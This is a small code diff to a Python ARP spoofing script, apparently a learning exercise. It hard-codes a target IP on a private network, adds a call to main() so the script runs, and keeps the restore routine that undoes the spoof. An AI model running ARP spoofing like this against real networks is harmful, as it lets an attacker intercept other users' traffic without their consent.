@@ -43,7 +43,7 @@ def main():
     gateways = netifaces.gateways()
     gateway_ip = gateways['default'][netifaces.AF_INET][0]
 
-    target_ip =  # Enter your target IP
+    target_ip =  "192.168.80.120"
     
     try:
         sent_packets_count = 0
@@ -59,3 +59,4 @@ def main():
         restore(gateway_ip, target_ip)
         restore(target_ip, gateway_ip)
         print("[+] Arp Spoof Stopped")
+main()
